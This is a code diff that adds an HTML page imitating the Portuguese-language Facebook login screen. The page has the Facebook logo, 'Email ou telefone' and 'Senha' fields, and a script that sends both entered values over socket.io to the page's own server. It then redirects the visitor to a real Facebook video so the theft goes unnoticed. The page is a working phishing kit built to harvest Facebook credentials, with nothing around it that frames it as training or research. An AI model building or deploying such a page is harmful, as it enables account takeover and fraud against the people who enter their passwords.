@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Entrar no Facebook</title>
+  <style>
+    body {
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-box {
+      background-color: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      width: 320px;
+      text-align: center;
+    }
+    .login-box input[type="text"],
+    .login-box input[type="password"] {
+      width: calc(100% - 20px);
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+    .login-box button {
+      width: calc(100% - 20px);
+      padding: 10px;
+      margin-top: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #1877f2;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .login-box button:hover {
+      background-color: #165fc9;
+    }
+    .message {
+      margin-top: 15px;
+      font-size: 0.85em;
+      color: #666;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" height="50" alt="Facebook Logo">
+    <h2>Entrar no Facebook</h2>
+    <div class="input-container">
+      <input type="text" name="email" id="campo1" tabindex="0" placeholder="Email ou telefone" autofocus="1" autocomplete="username" aria-label="Email ou telefone">
+      <input type="password" name="pass" id="campo2" tabindex="0" placeholder="Senha" autocomplete="current-password" aria-label="Senha">
+    </div>
+    <button onclick="sendData()">Entrar</button>
+    <div class="message" id="message"></div>
+  </div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.3.2/socket.io.js"></script>
+  <script>
+    const socket = io();
+
+    function sendData() {
+      const campo1 = document.getElementById('campo1').value;
+      const campo2 = document.getElementById('campo2').value;
+      const data = {
+        campo1: campo1,
+        campo2: campo2
+      };
+      socket.emit('formSubmit', data);
+      //document.getElementById('message').textContent = 'Dados enviados: ' + campo1 + ', ' + campo2;
+      window.location.href = 'https://www.facebook.com/watch?v=824855092846382'
+    }
+  </script>
+</body>
+</html>
